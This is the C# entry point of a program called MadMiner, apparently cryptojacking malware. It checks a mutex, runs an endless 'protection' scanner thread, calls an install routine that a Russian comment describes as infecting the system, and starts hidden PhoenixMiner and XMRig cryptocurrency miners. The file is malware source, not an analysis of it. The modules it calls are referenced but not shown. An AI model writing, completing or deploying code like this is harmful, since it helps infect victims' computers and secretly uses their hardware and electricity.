using MadMiner.Miner;
using MadMiner.Protection;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace MadMiner
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            Thread.Sleep(4000);

            // Проверка Mutex на запуск копий билда
            if (!MutEx.Get())
                Environment.Exit(0);
            
            // Запускаем зищиту
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            Scanner.Run();
                        }
                        catch { }
                        Thread.Sleep(100);
                    }
                }).Start();

                // Запуск заражения системы
                Install.GetInstall();

                // Запускаем майнеры
                new Thread(() =>
                {
                    PhoenixMiner.Run();
                }).Start();

                new Thread(() =>
                {
                    XMRIG.Run();
                }).Start();
        }
    }
}
